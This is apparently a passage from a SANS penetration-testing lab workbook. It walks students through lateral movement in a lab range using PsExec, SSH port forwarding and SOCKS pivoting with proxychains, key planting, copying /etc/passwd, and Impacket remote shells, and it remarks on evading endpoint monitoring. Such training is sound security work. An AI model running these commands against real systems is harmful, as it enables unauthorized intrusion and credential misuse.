We can see the state is Syn Sent to port 5985, but the connection is never established. With TCPView still running, let's try wmic to 10.130.10.5 . We don't need the output to know if a command runs. We only need to see ReturnValue = 0 to know the command executed successfully.

![](SEC560_WorkBook2_page_54_Figure_0.jpeg)

We can see that wmic fails, too. We see the error, and we don't see ReturnValue = 0 . We can see in TCPView that wmic attempts to connect to TCP port 135, but fails.

Let's make sure TCP 135 and 5985 are available. We'll use nmap first, though we could also send a list of ports into the Test-NetConnection cmdlet and use the foreach alias % to connect to each port, represented by \$\_ .

![](SEC560_WorkBook2_page_54_Figure_3.jpeg)

If you'd like, here's the syntax to perform the equivalent scan using Test-NetConnection and foreach . Fair warning: this command takes around 45 seconds to complete. (135, 5985) | %{ Test-NetConnection10.130.10.5 -Port \$\_ }

Both connections failed. TCP 135 is required for wmic and TCP 5985 is required for winrs , Invoke-Command, and Enter-PsSession. Without those, we need a tool that only relies on TCP 445, which is SMB. Let's look at PsExec.exe from SysInternals.

# *3: PsExec.exe*

Let's run ipconfig on 10.130.10.5 with PsExec.exe and monitor TCPView.

# Command

psexec \\10.130.10.5 -u hiboxy\bgreen -p Password1 -i ipconfig

# Expected Results

PS Y:\10.254.252.2> psexec \\10.130.10.5 -u hiboxy\bgreen -p Password1 -i ipconfig

PsExec v2.43 - Execute processes remotely Copyright (C) 2001-2023 Mark Russinovich Sysinternals - www.sysinternals.com

Windows IP Configuration

Ethernet adapter Ethernet:

Connection-specific DNS Suffix . : hiboxy.com

Link-local IPv6 Address . . . . . : fe80::e108:5ae1:4ccd:54f%8

IPv4 Address. . . . . . . . . . . : 10.130.10.5 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 10.130.10.1

ipconfig exited on 10.130.10.5 with error code 0.

There is a bit of a delay, but it runs. Looking at TCPView, we can see PsExec make a connection over TCP 445, attempt to switch to TCP 135, and then falls back to using 445 for the rest of command execution.

![](SEC560_WorkBook2_page_56_Figure_0.jpeg)

If you were to run the same command against MAIL01, there would be no delay.

![](SEC560_WorkBook2_page_56_Figure_2.jpeg)

The delay is PsExec making the initial connection over TCP 445, then trying to switch to TCP 135, and then falling back to TCP 445.

To clean up, let's remove the mapped drive:

C:

net use Y: /delete

# Expected Results

PS Y:\10.254.252.2> C:

PS C:\Users\sec560> net use Y: /delete

Y: wasdeleted successfully.

# Conclusion

Great work! In this lab, you used a compromised Windows system to run commands on other Windows systems. Unfortunately, bgreen didn't have administrative access to any systems connected to the 10.130.11.0/24 network. In the next lab, we'll try moving laterally to that subnet with Linux.

# *Bonus 1*

We discussed that PsExec.exe works by creating a service on a remote system and starting it. If PsExec.exe isn't available, we can use sc.exe command as System.

### *Bonus 2*

If you have extra time, try to run commands using SharpRDP.exe, which is included in the SharpCollection, C: \bin\SharpCollection\NetFramework\_4.7\_Any\ . Hint: You'll first need to find potential targets listening on TCP 3389.

# *Lab 4.5: Lateral Movement from Linux*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

Not all of Hiboxy's infrastructure is Windows-based. You'll leverage compromised SSH credentials to access their Linux jump servers, which serve as bastion hosts between network segments. These systems prove to be the perfect pivot points to reach the isolated 10.130.11.0/24 network.

By establishing SSH tunnels and SOCKS proxies, you'll route your attack tools through these compromised Linux systems. The combination of key-based authentication and dynamic port forwarding will provide persistent and stealthy access channels that blend in with legitimate administrative tra ffic.

→

# Lab Setup

VMs used:

Linux •

You should be able to ping 10.130.10.10 from the Linux VM:

#### Command

ping -c 4 10 .130.10.10

#### Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.10 PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data. 64 bytes from 10.130.10.10: icmp\_seq=1 ttl=63 time=52.4 ms 64 bytes from 10.130.10.10: icmp\_seq=2 ttl=63 time=51.2 ms 64 bytes from 10.130.10.10: icmp\_seq=3 ttl=63 time=61.8 ms 64 bytes from 10.130.10.10: icmp\_seq=4 ttl=63 time=46.1 ms

--- 10.130.10.10 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3006ms rtt min/avg/max/mdev = 46.105/52.867/61.785/5.662 ms

# Lab – Step-by-Step Instructions

# *1: Target Identification*

As we learned earlier in this class, 10.130.10.21 and 10.130.11.13 system are both Windows. Let's check which of these hosts is listening (and accessible) on TCP port 445.

Using Nmap, identify which systems are listening on port 445.

# Command

nmap -n -Pn -p 445 10.130.10.21 10.130.11.13

# Expected Results

sec560@560vm:~\$ nmap -n -Pn -p 445 10.130.10.21 10.130.11.13 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:12 UTC Nmap scan report for 10.130.10.21 Host is up (0.046s latency).

PORT STATE SERVICE 445/tcp open microsoft-ds

Nmap scan report for 10.130.11.13 Host is up.

PORT STATE SERVICE 445/tcp filtered microsoft-ds

Nmap done: 2 IP addresses (2 hosts up) scanned in 0.49 seconds

You can see that we can't access TCP port 445 on 10.130.11.13 -- at least not from where we are now, over the VPN.

# *2: SSH for Interactive Shells and Single Commands*

First, let's get used to SSH itself. The only required option for ssh is the target (hostname or IP), such as ssh 10.130.10.22 . By default, the ssh client will use the current local user's username as the target username. If you want to log in as an alternative user name (such as alex ), you can do ssh -l alex 10.130.10.22 or, more commonly, ssh alex@10.130.10.22 .

10.130.10.22 is a Linux system, and we'll use it as a pivot point to reach the 10.130.11.0/24 subnet after first gaining some experience with SSH itself.

If your user account already has key-based authentication set up, and the private key is either cached or doesn't require a password on the client side, then you won't need to type in a password. In our use case, though, username bgreen has the associated password Password1 (which we've seen before).

Let's start by SSH-ing in to 10.130.10.22 as username bgreen from your Linux virtual machine:

## Command

ssh bgreen@10.130.10.22

# Expected Results

Warning: Permanently added '10.130.10.22' (ECDSA) to the list of known hosts. bgreen@10.130.10.22's password:

The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.

bgreen@jump02:~\$

# Note

If this is the first time you've connected to this SSH server, you'll see a warning about adding the server to your list of known hosts. This is normal and expected. Type yes and press Enter when prompted.

When prompted, enter Password1 as the password for username bgreen, as shown in the highlighted line above.

Next, let's run a few commands to determine more about this remote host:

```
lsb_release -a
id
sudo -l -l
```

# Expected Results

bgreen@jump02:~\$ lsb\_release -a No LSB modules are available.

Distributor ID: Ubuntu

Description: Ubuntu 24.04 LTS

Release: 24.04 Codename: noble bgreen@jump02:~\$ id

uid=1000(bgreen) gid=1000(bgreen) groups=1000(bgreen)

bgreen@jump02:~\$ sudo -l -l [sudo] password for bgreen:

Sorry, user bgreen may not run sudo on jump02.

When prompted, enter the password of Password1 for the sudo -l -l command.

Whenever you gain access to a Linux machine as a new user, one of your first commands should generally be sudo -l -l . Instead of running a command with delegated authority, sudo -l -l lists the commands that user can run. You should generally examine any of the displayed commands, including their man pages and sites such as GTFOBins.

While the user bgreen is not administrative, there is still significant attack surface available. Since we can cause jump02 to make TCP connections, fundamentally we can route tra ffic through it. The rest is merely details.

Let's start off by seeing if the jump02 system can reach 10.130.11.13 on TCP port 445. Remember, we can't reach this host directly from across the VPN!

# Command

nc -v -z 10.130.11.13 445

#### Expected Results

bgreen@jump02:~\$ nc -v -z 10.130.11.13 445

Connection to 10.130.11.13 445 port [tcp/microsoft-ds] succeeded!

Excellent! We now know we can authenticate as a limited user ( bgreen) to jump02, and that jump02 can reach the 10.130.11.0/24 subnet that we can't reach directly.

For now, let's exit this session:

![](SEC560_WorkBook2_page_62_Figure_2.jpeg)

Next, let's show some lesser-known capabilities of ssh itself. While it's often used to run an interactive shell, ssh can generally start any command on the destination machine. Let's start by running a single command:

![](SEC560_WorkBook2_page_62_Figure_4.jpeg)

When prompted, enter the password ( Password1) again. Here, we see the output from the id command, which runs, displays its normal output, and then exits.

Being prompted for bgreen's password over and over again sure is annoying, isn't it? Let's fix that next.

First, let's set up our own SSH keypair on the SEC560 Linux virtual machine:

ssh-keygen

#### Expected Results

sec560@560vm:~\$ ssh-keygen

```
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/sec560/.ssh/id_ed25519): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/sec560/.ssh/id_ed25519
Your public key has been saved in /home/sec560/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:ivREOAd9ldTB1xVYt9c6uOB9buNW3Oa6PoAlXtcgisA sec560@560vm
The key's randomart image is:
+--[ED25519 256]--+
| .o oo+..o+=|
| oE . . +.o =|
| o oo . . o +o|
| + . o o...o|
| . . S..=..o..|
| . + . .oo.. .=|
| . o . o..+ |
| o= .|
| =*= |
```

Press Enter for each of the prompts, accepting the defaults.

+----[SHA256]-----+

You now have an SSH keypair, consisting of a public key (/home/sec560/.ssh/id\_ed25519.pub ) which you can share freely, and a private key ( /home/sec560/.ssh/id\_ed25519 ) that generally needs to stay secret.

If a user has a file called authorized\_keys in their ~/.ssh folder, any public keys listed in that plain text file can log on automatically with the corresponding private key. In other words, if you add the contents of id\_ed25519.pub to your authorized\_keys file, you can SSH into your Linux virtual machine without a password prompt!

Let's give this a try:

```
cat /home/sec560/.ssh/id_ed25519.pub >> /home/sec560/.ssh/authorized_keys
sudo service ssh start
ssh localhost "echo hello; sleep 1; echo from; sleep 1; echo inside; sleep 1; echo SSH; exit"
```

# Expected Results

```
sec560@560vm:~$ cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
sec560@560vm:~$ sudo service ssh start
sec560@560vm:~$ ssh localhost "echo hello; sleep 1; echo from; sleep 1; echo inside; sleep 
1; echo SSH; exit"
hello
from
inside
SSH
```

#### Note

Since this is likely the first time you've connected to your Linux VM via SSH, you'll get another host key warning. Type yes and press Enter when prompted.

Note that you can chain together commands with semicolons as normal, but special characters such as ; are better run inside quotes so they're not interpreted by your local shell.

Instead of doing this process manually, though, let's use a convenient script ( ssh-copy-id ) to automatically add our public keys to 10.130.10.22. apropos will give a useful one-liner description of the ssh-copy-id command.

apropos ssh-copy-id ssh-copy-id bgreen@10.130.10.22

# Expected Results

sec560@560vm:~\$ apropos ssh-copy-id

ssh-copy-id (1) - use locally available keys to authorise logins on a remote machine sec560@560vm:~\$ ssh-copy-id bgreen@10.130.10.22

/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed

/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys

bgreen@10.130.10.22's password:

Number of key(s) added: 1

Now try logging into the machine, with: "ssh 'bgreen@10.130.10.22'" and check to make sure that only the key(s) you wanted were added.

When prompted on the highlighted line, enter Password1 for the last time. Your SSH keyfile is now in place, and you can log on automatically without any password prompt for any SSH-using utilities!

Let's first validate that we can log in without a password prompt by running ip -br a non-interactively as a single command:

### Command

ssh bgreen@10.130.10.22"ip -br a"

# Expected Results

sec560@560vm:~\$ ssh bgreen@10.130.10.22"ip -br a" lo UNKNOWN 127.0.0.1/8 ::1/128

ens3 UP 10.130.10.22/24 metric 100 fe80::454:e0ff:fe83:1249/64

docker0 DOWN 172.17.0.1/16

Next, let's test this with scp (which also uses key-based authentication) to copy out /etc/passwd:

scp bgreen@10.130.10.22:/etc/passwd /tmp/10.130.10.22\_passwd.txt

#### Expected Results

sec560@560vm:~\$ scp bgreen@10.130.10.22:/etc/passwd /tmp/10.130.10.22\_passwd.txt passwd 100% 1893 17.1KB/s 00:00

Excellent! We copied out that file without any further prompting for bgreen's password.

# *3: SSH for Pivoting (Single Port Redirection)*

Next, let's use SSH itself for our pivoting. We'll start with a Local port redirect using -L . The SSH client (our Linux VM) will be listening on a new port that will be routed by the SSH server to a destination server and port from the SSH server's perspective.

Now let's set up our SSH tunnel. We still have passwordless authentication set up from our prior step, so this should go fast.

# Command

ssh -L 7777:10.130.11.13:445 bgreen@10.130.10.22

### Expected Results

sec560@560vm:~\$ ssh -L 7777:10.130.11.13:445 bgreen@10.130.10.22 Last login: Wed Aug 21 20:13:17 2024 from 10.254.252.3 bgreen@jump02:~\$

# Information

The output after Last login: will differ for you.

The full syntax for a local port redirect via SSH is -L local\_ip:local\_port:server\_ip:server\_port , breaking down as follows:

- local\_ip : The IP address on the SSH client to listen on (defaults to 127.0.0.1 if left blank) •
- local\_port : The TCP port on the SSH client to listen on while the SSH session is open •
- server\_ip : The IP address that the SSH server will be tunneling connections to •
- server\_port : The TCP port that the SSH server will be tunneling connections to •

While it's common for the server\_ip and server\_port to be a service running on the SSH server itself, it doesn't have to be. In our case, 10.130.11.13 is a remote machine accessible *through* the SSH server (10.130.10.22).

The bgreen user is not a privileged account on the Linux system, which makes this attack even more fantastic.

#### Warning

The SSH client must remain open for the redirected port to remain available. Do not exit your SSH session on 10.130.10.22, and instead open a new terminal window or tab for the next step.

# Open a new terminal window for the next step!

As long as the SSH session is active, our local port 7777 will be listening. Let's verify that:

| Command                   |     |                    |           |        |  |
|---------------------------|-----|--------------------|-----------|--------|--|
|                           |     |                    |           |        |  |
| ss -tlnp                  |     |                    |           |        |  |
| Expected Results          |     |                    |           |        |  |
|                           |     |                    |           |        |  |
| sec560@560vm:~\$ ss -tlnp |     |                    |           |        |  |
| State Recv-Q Send-Q       |     | Local Address:Port | Peer      |        |  |
| Address:Port              |     |                    |           |        |  |
| LISTEN 0                  | 128 | 127.0.0.1:7777     | 0.0.0.0:* | users: |  |
| (("ssh",pid=13442,fd=5))  |     |                    |           |        |  |
| LISTEN 0                  | 128 | 127.0.0.53%lo:53   |           |        |  |
| 0.0.0.0:*                 |     |                    |           |        |  |
|                           | 128 | 0.0.0.0:22         |           |        |  |
|                           |     |                    |           |        |  |
| LISTEN 0                  |     |                    |           |        |  |
| 0.0.0.0:*                 |     |                    |           |        |  |
| LISTEN 0                  | 128 | *:80               |           |        |  |
| *:*<br>LISTEN 0           | 128 | [::]:22            | [::]:*    |        |  |

In the ss output, we see that the SSH process is listening on our local TCP port 7777. SSH will tunnel that traffic using the same encryption as the existing SSH session, and the destination machine (10.130.11.13) will see the tra ffic as coming from the SSH server (10.130.10.22).

We'll show more about Impacket soon, but for now we'll use one utility to display some information about the 10.130.11.13 host:

DumpNTLMInfo.pylocalhost -port 7777

# Expected Results

sec560@560vm:~\$ DumpNTLMInfo.pylocalhost -port 7777

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Defaulting to SMB protocol.
- [\*] Using target: localhost, IP: localhost, Port: 7777, Protocol: SMB
- [+] SMBv1 Enabled : False
- [+] Prefered Dialect: SMB 3.0
- [+] Server Security : SIGNING\_ENABLED (not required)
- [+] Max Read Size : 8.0 MB (8388608 bytes)
- [+] Max Write Size : 8.0 MB (8388608 bytes)
- [+] Current Time : 2024-09-26 18:57:41.439910+00:00
- [+] Name : SQL02 [+] Domain : HIBOXY
- [+] DNS Domain Name : hiboxy.com
- [+] DNS Host Name : sql02.hiboxy.com
- [+] OS : Windows NT 10.0 Build 20348
- [+] Null Session : False

Here, we see that SSH is tunneling our local listening port 7777 to sql02.hiboxy.com's SMB server. It's impressive how much information you can get from even modern SMB servers, even without authentication!

While ssh -L is perhaps simpler to understand, it does redirect a *single* service that the SSH server can see. You can specify -L multiple times to redirect more than one service, but that quickly becomes cumbersome. Instead, we'll next focus on ssh -D to create a proxy that redirects *any* traffic through the SSH server.

Go ahead and exit out of your SSH session on jump02:

#### Command

exit

#### Expected Results

bgreen@jump02:~\$ exit

logout

Connection to 10.130.10.22 closed.

#### *4: SSH for Pivoting (Dynamic SOCKS Proxy)*

ssh -D is a D ynamic SOCKS proxy, essentially a VPN. The VPN service (SOCKS version 5) will be listening on the SSH client, but using the SOCKS proxy service will browse from the perspective of the SSH server.

The syntax is simpler than -L , requiring just a port number:

# Command

ssh bgreen@10.130.10.22 -D 1080

# Expected Results

sec560@560vm:~\$ ssh bgreen@10.130.10.22 -D 1080 Last login: Wed Aug 21 20:24:09 2024 from 10.254.252.3 bgreen@jump02:~\$

### Information

The output after Last login: will differ for you.

#### Warning

The SSH client must remain open for the redirected port to remain available. Do not exit your SSH session on 10.130.10.22, and instead open a new terminal window or tab for the next step.

# Open a new terminal window for the next step!

As before, in a new terminal window we'll see the new listening port:

```
Command
 ss -tlnp | grep 1080
 Expected Results
  sec560@560vm:~$ ss -tlnp | grep 1080
  LISTEN 0 128 127.0.0.1:1080 0.0.0.0:* users:(("ssh",pid=68249,fd=5))
  LISTEN 0 128 [::1]:1080 [::]:* users:
  (("ssh",pid=68249,fd=4))
```

You can configure some tools to use a SOCKS proxy directly, such as curl --socks5 127.0.0.1:1080 or Firefox. Some tools use a connect() system call , which the proxychains utility can intercept as we'll use momentarily. Some tools send their own raw traffic and are generally difficult to force through a proxy -- for example, masscan or Nmap when running a SYN stealth scan.

For now, let's compare the results of an Nmap scan with and without proxychains.

First, let's remind ourselves that we can't reach 10.130.11.13 directly, first by running Nmap without proxychains:

```
Command
 nmap -sT 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:
 Expected Results
   sec560@560vm:~$ nmap -sT 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:
   Host: 10.130.11.13 () Ports: 445/filtered/tcp//microsoft-ds///, 1433/filtered/tcp//ms-
   sql-s///
```

Next, we'll show that proxychains cannot intercept connect() system calls from a SYN stealth scan, as Nmap won't be using the connect() system call (it's sending raw packets instead):

sudo proxychains nmap -sS 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:

# Expected Results

```
sec560@560vm:~$ sudo proxychains nmap -sS 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/local/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17
Host: 10.130.11.13 () Ports: 445/filtered/tcp//microsoft-ds///, 1433/filtered/tcp//ms-
```

Now we'll see the proxychains configuration (where proxychains will push connect() system calls through the SOCKS proxy on local port 1080), then use Nmap with proxychains and the connect() system call using -sT :

# Command

sql-s///

```
tail -n 2 /etc/proxychains.conf
proxychains nmap-sT 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:
```

# Expected Results

```
sec560@560vm:~$ tail -n 2 /etc/proxychains.conf
proxychains nmap -sT 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports:
socks4 127.0.0.1 1080
```

[proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.17 [proxychains] Strict chain ... 127.0.0.1:1080 ... 10.130.11.13:445 ... OK [proxychains] Strict chain ... 127.0.0.1:1080 ... 10.130.11.13:1433 ... OK Host: 10.130.11.13 () Ports: 445/open/tcp//microsoft-ds///, 1433/open/tcp//ms-sql-s/

Note each connection from Nmap gets a status line (beginning with [proxychains] ) from proxychains.

Importantly, we can also see that ports 445 and 1433 are now open on 10.130.11.13!

To close the loop, we'll also show that SYN stealth scans bypass proxychains due to the raw nature of the tra ffic:

# Command sudo proxychains nmap -sS 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports: Expected Results sec560@560vm:~\$ sudo proxychains nmap -sS 10.130.11.13 -p 445,1433 -Pn -n -oG - | grep Ports: [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.17 Host: 10.130.11.13 () Ports: 445/filtered/tcp//microsoft-ds///, 1433/filtered/tcp//mssql-s///

Here, we don't see any [proxychains] lines from proxychains showing the intercepted traffic. Nmap instead sends the traffic directly (bypassing the proxy), and the results are still filtered.

There's a lot more you can do with SOCKS proxying. Most endpoint defenses are not configured to intercept network traffic of nonsuspicious binaries. By using SSH itself (which is a trusted binary), as long as any outbound firewalls allow the SSH control traffic, the proxied traffic isn't generally considered suspicious.

Most organizations depend on endpoint defenses (AV, EDR, XDR, etc) and spend less effort monitoring network traffic. If you can operate from a system without endpoint defensive software, it's di fficult for those organizations to even get initial alerts.

For now, though, let's close our SSH session(s) and finish the lab.

![](SEC560_WorkBook2_page_72_Figure_5.jpeg)

#### Conclusion

As you can see, SSH is not only great for defenders and administrators -- it's great for attackers too! We'll continue to use SSH throughout the class.

# *Lab 4.6: Impacket*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

Hiboxy's hybrid environment requires tools that can speak Windows protocols from any platform. The Impacket suite becomes your Swiss Army knife for interacting with Windows services from your Linux attack platform.

You'll use wmiexec for remote command execution, smbclient for share enumeration and file retrieval, and lookupsid to enumerate domain users. These Python-based tools provide the flexibility to work with both cleartext credentials and NTLM hashes, making them perfect for the various credential formats you've collected throughout the engagement.

→

# Lab Setup

VMs used:

- Linux •
- Windows 11 •

You should be able to ping 10.130.10.10 from the Linux VM:

ping -c 4 10 .130.10.10

# Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.10
PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data.
64 bytes from 10.130.10.10: icmp_seq=1 ttl=63 time=59.2 ms
64 bytes from 10.130.10.10: icmp_seq=2 ttl=63 time=47.4 ms
64 bytes from 10.130.10.10: icmp_seq=3 ttl=63 time=49.7 ms
64 bytes from 10.130.10.10: icmp_seq=4 ttl=63 time=45.5 ms
--- 10.130.10.10 ping statistics ---
```

4 packets transmitted, 4 received, 0% packet loss, time 3007ms rtt min/avg/max/mdev = 45.505/50.470/59.234/5.274 ms

# Lab – Step-by-Step Instructions

Impacket is a very powerful toolset that allows us to interact with a number of Windows services. The beautiful thing is, all the code is available so we can use the tools and build on it to create other tools!

We're going to take a look at a few features of Impacket.

## *1: wmiexec.py*

This tool allows us to run commands on a remote service. It does require we have Admin level access on the target. The biggest drawback is that it uses DCOM and we need to be able to access DCOM ports on the target system, but they are sometimes blocked by a firewall, and you may have to use another tool, such as smbclient.py (discussed later).

The syntax of the command is:

wmiexec.py[[ domain/] username[ :password] @] <targetNameor address> command

At a minimum, we need to provide a username, target, and command.

wmiexec.py username@targetcommand

Let's target your Windows VM.

wmiexec.py sec560@WINDOWS\_ETHERNET0\_ADDRESS hostname

Type the password sec560 when prompted.

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154hostname Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

# Password:

[\*] SMBv3.0 dialect used

SEC560-Windows

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

We can use built-in Windows protocols to run commands on a remote system. Even better, we don't need an agent on that system!

# Save time with command reuse!

You can press the up arrow to repeat the previous command. This allows you to edit the command instead of typing from scratch.

Let's see who we are authenticating as with whoami. Press the up arrow, then replace hostname with whoami.

wmiexec.py sec560@WINDOWS\_ETHERNET0\_ADDRESS whoami

Type the password sec560 when prompted.

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154whoami Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

# Password:

[\*] SMBv3.0 dialect used

sec560-windows\sec560

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

The command returns the computername ( sec560-windows) followed by the username ( sec560).

By now, you're probably getting annoyed that you have to type your password each time. Let's make this easier and put :password (where the password is sec560) right after the username.

#### Command

wmiexec.py sec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS whoami

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154whoami Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

sec560-windows\sec560

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

The way we are running this, each command is independent of the others. Let's explore this.

First, let's look at our current directory location by running cd.

#### Command

wmiexec.py sec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS cd

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154cd Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

C:\

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

In Windows' cmd.exe, the cd (with no arguments) command shows us our current directory (similar to pwd on Linux).

Next, let's change directories to Users.

wmiexec.py sec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS cd users wmiexec.py sec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS cd

This command has no output.

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154cd users Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154cd

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

C:\

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

Notice that it doesn't remember that you changed into the Users directory. We can work around this by using the full path to files, but this can require a lot of extra typing. Let's run the tool interactively, where it DOES remember your location!

Run the tool again, but with no command at the end. This will start an interactive session.

wmiexec.py sec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS

# Expected Results

sec560@560vm:~\$ wmiexec.py sec560:sec560@10.10.10.154

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] SMBv3.0 dialect used
- [!] Launching semi-interactive shell Careful what you execute
- [!] Press help for extra shell commands

C:\>

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

Now we have an interactive prompt! Let's try a few commands to see what happens.

#### Commands

cd users whoami cd

# Expected Results

C:\>cd users

C:\Users>whoami

sec560-windows\sec560

C:\Users>cd

C:\Users

Notice that the tool remembers the location now, even after running another command in the middle!

Let's exit the shell.

exit

Let's take a look at another tool, smbexec.py.

#### *2: smbexec.py*

This tools works similar to the wmiexec. It can operate in two modes, depending on how the tool is run. According to the documentation:

- share mode: you specify a share, and everything is done through that share. •
- server mode: if for any reason there's no share available, this script will launch a local SMB server, so the output of the commands executed are sent back by the target machine into a locally shared folder. Keep in mind you would need root access to bind to port 445 in the local machine. •

In "share mode", our tool will write to the disk of the target system. We often do not want to write to disk since this leaves extra artifacts. In "server mode", all the writing is done to a share on the attackers system and the remote system connects to the attacking system. The server runs on port 445 and requires root access to listen on that port. We'll run the tool in server mode as root.

The syntax of these Impacket tools is similar. We can simply hit the up arrow, press CTRL+ a to jump to the beginning of the line, and replace wmi with smb.

# Command

sudo smbexec.pysec560:sec560@WINDOWS\_ETHERNET0\_ADDRESS

# Expected Results

sec560@560vm:~\$ sudo smbexec.pysec560:sec560@10.10.10.154 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute C:\Windows\System32>

# Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

This is very similar to the previous tool. Let's look at the whoami command.

# Command whoami Expected Results C:\Windows\System32> whoami nt authority\system

Notice we are running as system. This may be desirable, or it may not be. It depends if you need super permission (with system) or if you need access as a regular or domain user (to access other resources).

Let's change directories.

# Command cd users Expected Results C:\WINDOWS\system32> cd users [-] You can't CD under SMBEXEC. Use full paths.

Notice that this shell isn't persistent. We can't change directories so we always have to use the full paths to navigate. Let's see what that looks like.

dir \users

# Expected Results

C:\Windows\System32>dir C:\Users Volume in drive C is Windows Volume Serial Number is 2640-3053

Directory of C:\Users

08/17/2024 04:39 PM <DIR> .

08/17/2024 04:35 PM <DIR> Public 08/21/2024 01:49 PM <DIR> sec560

0 File(s) 0 bytes

3 Dir(s) 53,043,986,432 bytes free

# Your output may vary

Depending on which accounts you've used on your Windows VM, your output may differ.

If we want to look in the sec560 directory under Users, we have to use the full path, like this:

dir C:\users\sec560

#### Expected Results

C:\Windows\System32>dir C:\users\sec560 Volume in drive C is Windows Volume Serial Number is 2640-3053

#### Directory of C:\users\sec560

08/21/2024 01:49 PM <DIR> . 08/17/2024 04:39 PM <DIR> .. 08/17/2024 04:58 PM <DIR> .local 08/17/2024 05:00 PM <DIR> .ssh 08/17/2024 05:01 PM <DIR> .vscode 08/17/2024 04:35 PM <DIR> Contacts [...trimmed for brevity...] 3 File(s) 3,688 bytes 18 Dir(s) 53,043,982,336 bytes free

If we want to go another level we need use the full path again. Fortunately, you can press the up arrow to access your previous command and simply add \Desktop to the end.

Press the up arrow and add \Desktop to the end of the command.

dir \users\sec560\Desktop

# Expected Results

C:\Windows\System32>dir C:\users\sec560\Desktop Volume in drive C is Windows Volume Serial Number is 2640-3053

Directory of C:\users\sec560\Desktop

08/21/2024 12:56 PM <DIR> . 08/21/2024 01:49 PM <DIR> ..

08/17/2024 04:57 PM 1,125 Icecast2 Win32.lnk 08/21/2024 12:56 PM 2,235 Nmap - Zenmap GUI.lnk

2 File(s) 3,360 bytes

2 Dir(s) 53,044,019,200 bytes free

The choice between the smbexec.py and wmiexec.py comes down to what is available on the remote system and personal preference.

Close down your remote console session by typing exit . Then, let's take a look at another tool: smbclient.py.

#### *3: smbclient.py*

